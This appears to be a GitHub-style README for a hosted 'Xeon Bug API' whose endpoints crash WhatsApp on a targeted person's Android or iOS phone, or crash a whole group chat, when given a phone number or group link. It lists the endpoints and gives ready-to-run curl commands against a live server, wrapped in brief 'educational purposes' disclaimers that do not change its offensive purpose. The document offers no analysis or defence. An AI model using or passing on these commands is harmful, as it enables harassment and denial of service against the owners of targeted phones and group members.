
# 🚀 Xeon Bug API

The **Xeon Bug API** is a powerful endpoint API developed by **[Dream Guy Xeon](https://github.com/DGXeon)** to exploit vulnerabilities in WhatsApp. This API provides endpoints that can:

- 🛑 Crash WhatsApp on Android devices.
- 🍎 Crash WhatsApp on iOS devices.
- 💥 Crash entire WhatsApp group chats.

> **⚠️ Warning:** This API is for educational purposes only. Misuse of this tool may result in serious legal consequences. Use responsibly.

---

## 🌟 Features

- 🔥 **Crash Android Devices**  
- 🍏 **Crash iOS Devices**  
- 💬 **Crash Group Chats**

---

## 📌 Endpoints

### 1️⃣ **Freeze Android WhatsApp**  
**Description:** Freezes and crashes WhatsApp on Android devices.  
**Endpoint:**  
```bash
GET https://xeon-bug-api.onrender.com/freezeDroid?target=${number}
```  
**Parameters:**  
| Key      | Type   | Description                        |
|----------|--------|------------------------------------|
| `target` | String | The WhatsApp number to be targeted |

---

### 2️⃣ **Crash iOS WhatsApp**  
**Description:** Crashes WhatsApp on iOS devices.  
**Endpoint:**  
```bash
GET https://xeon-bug-api.onrender.com/iosCrash?target=${number}
```  
**Parameters:**  
| Key      | Type   | Description                        |
|----------|--------|------------------------------------|
| `target` | String | The WhatsApp number to be targeted |

---

### 3️⃣ **Crash Group Chats**  
**Description:** Crashes an entire WhatsApp group chat.  
**Endpoint:**  
```bash
GET https://xeon-bug-api.onrender.com/iosCrash?target=${grouplink}
```  
**Parameters:**  
| Key        | Type   | Description                              |
|------------|--------|------------------------------------------|
| `target`   | String | The WhatsApp group chat link to target.  |

---

## ⚠️ Disclaimer

**Note:**  
This API is designed strictly for educational and research purposes to highlight vulnerabilities in applications. Any unauthorized use to harm individuals, groups, or organizations is strictly prohibited. Ensure you comply with all applicable laws before using this API.

---

## 💻 Example Usage

```bash
# Freeze Android WhatsApp
curl -X GET "https://xeon-bug-api.onrender.com/freezeDroid?target=1234567890"

# Crash iOS WhatsApp
curl -X GET "https://xeon-bug-api.onrender.com/iosCrash?target=1234567890"

# Crash Group Chat
curl -X GET "https://xeon-bug-api.onrender.com/iosCrash?target=https://chat.whatsapp.com/exampleGroupLink"
```

---

### 👨‍💻 Developed By: **[Dream Guy Xeon](https://github.com/DGXeon)**

Enjoy bugging responsibly! ✨
